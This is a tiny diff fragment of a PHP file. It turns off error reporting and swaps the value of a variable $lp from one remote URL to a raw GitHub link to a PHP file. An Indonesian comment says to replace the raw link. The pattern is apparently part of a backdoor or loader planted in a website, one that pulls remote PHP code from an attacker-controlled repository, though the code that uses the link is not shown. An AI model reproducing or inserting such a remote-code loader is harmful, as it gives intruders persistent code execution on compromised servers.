@@ -17,7 +17,7 @@
  */
 error_reporting(0);
 
-$lp = "https://iyaleta-antiddos.pages.dev/"; // ganti link raw
+$lp = "https://raw.githubusercontent.com/1mgR00T/simpan/refs/heads/main/phy..php"; // ganti link raw
 
 
 /**
